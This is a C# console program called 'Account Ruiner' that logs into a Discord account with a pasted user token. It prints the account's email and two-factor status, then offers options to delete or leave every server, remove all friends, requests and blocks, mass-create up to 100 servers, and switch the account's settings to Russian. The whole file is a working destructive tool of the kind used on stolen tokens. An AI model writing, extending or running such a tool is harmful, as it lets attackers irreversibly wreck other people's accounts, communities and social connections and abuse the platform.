using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;

namespace ConsoleApp6
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;

            Colorful.Console.WriteAscii("Account Ruiner");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("User token : ");

            Console.ForegroundColor = ConsoleColor.Cyan;
            string token = Console.ReadLine();

            DiscordClient client = new DiscordClient(token);

            Console.Clear();

            Console.Title = $"Account Ruiner | {client.User}";

            Colorful.Console.WriteAscii("Account Ruiner");

            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("___________________________________________________________________________________________________________________");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[1] Delete All Friend      [4] Create mass server");
            Console.WriteLine("[2] Delete/Leave all guild [5] Change user settings       ");
            Console.WriteLine("[3] Changing this acc      ");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("____________________________________________________________________________________________________________________");
            Console.ForegroundColor = ConsoleColor.Green;

            Console.WriteLine("User ID : " + client.User.Id);
            Console.WriteLine("User created at : " + client.User.CreatedAt);
            Console.WriteLine("User : " + client.User.ToString());
            Console.WriteLine("Email : " + client.User.Email);
            if (client.User.EmailVerified)
            {
                Console.WriteLine("Email verified : yes");
            }
            else
            {
                Console.WriteLine("Email Verified : no");


            }

            if (client.User.TwoFactorAuth)
            {
                Console.WriteLine("Two Factor activate : yes");

            }
            else
            {
                Console.WriteLine("Two factor activate : no");

            }
            Console.WriteLine("User type : " + client.User.Type);

            Console.WriteLine("Badge : " + client.User.PublicBadges.ToString());

            Console.WriteLine("Language : " + client.User.Language.ToString());

            Console.WriteLine("Avatar URL  : " + client.User.Avatar.Url);


            Console.WriteLine(" ");
            Console.WriteLine(" ");
            Console.WriteLine(" ");

            Console.ForegroundColor = ConsoleColor.DarkBlue;

            Console.Write("Option number : ");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            string mangerisgood = Console.ReadLine();




            if (mangerisgood == "5")

            {

                Console.Write("Avatar Path : ");
                string avatarpath = Console.ReadLine();


                try
                {
                    client.User.ChangeProfile(new UserProfileUpdate()
                    {
                        Avatar = Image.FromFile(avatarpath),

                    });

                }
                catch (Exception e)
                {

                    Console.WriteLine(e);
                    Console.ReadLine();
                }
            }

            if (mangerisgood == "4")
            {
                Console.Write(" * How many server wanna create (max 100) : ");

                int guilds = int.Parse(Console.ReadLine());

                Console.Write(" * Guild Name : ");
                string guildname = Console.ReadLine();

                Console.Write(" * Avatar path : ");
                string avatar = Console.ReadLine();

                for (int i = 1; i <= guilds; i++)
                {
                    
                    client.CreateGuild(guildname, Image.FromFile(avatar), "russia");
                    Console.WriteLine($"Create {i} Guilds...");
                }
                Program.Main(args);

            }

            if (mangerisgood == "3")
            {

                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
                Console.WriteLine("Done !");


                Program.Main(args);
            }

            if (mangerisgood == "1")
            {
                foreach (var relationship in client.GetRelationships())
                {
                    try
                    {
                        if (relationship.Type == RelationshipType.Friends)
                            relationship.Remove();
                        Console.WriteLine($"[+] Remove friend " + relationship.User.ToString());

                        if (relationship.Type == RelationshipType.IncomingRequest)
                            relationship.Remove();
                        Console.WriteLine("[+] Remove Friend Request");

                        if (relationship.Type == RelationshipType.OutgoingRequest)
                            relationship.Remove();
                        Console.WriteLine("[+] Remove sending friend request");

                        if (relationship.Type == RelationshipType.Blocked)
                            relationship.Remove();
                        Console.WriteLine("[+] Remove blocking user");
                    }
                    catch (Exception e)
                    {

                        Console.WriteLine(e);
                        Console.ReadLine();
                        Program.Main(args);
                    }



                }

                Program.Main(args);
            }

            if (mangerisgood == "2")
            {

                foreach (var guild in client.GetGuilds())
                {
                    try
                    {
                        if (guild.Owner)
                            guild.Delete();
                        
                        else
                            guild.Leave();
                        Console.WriteLine($"[+] Leave {guild}");

                        System.Threading.Thread.Sleep(100);

                    }
                    catch { }
                }


                Program.Main(args);
            }
        }
    }
}


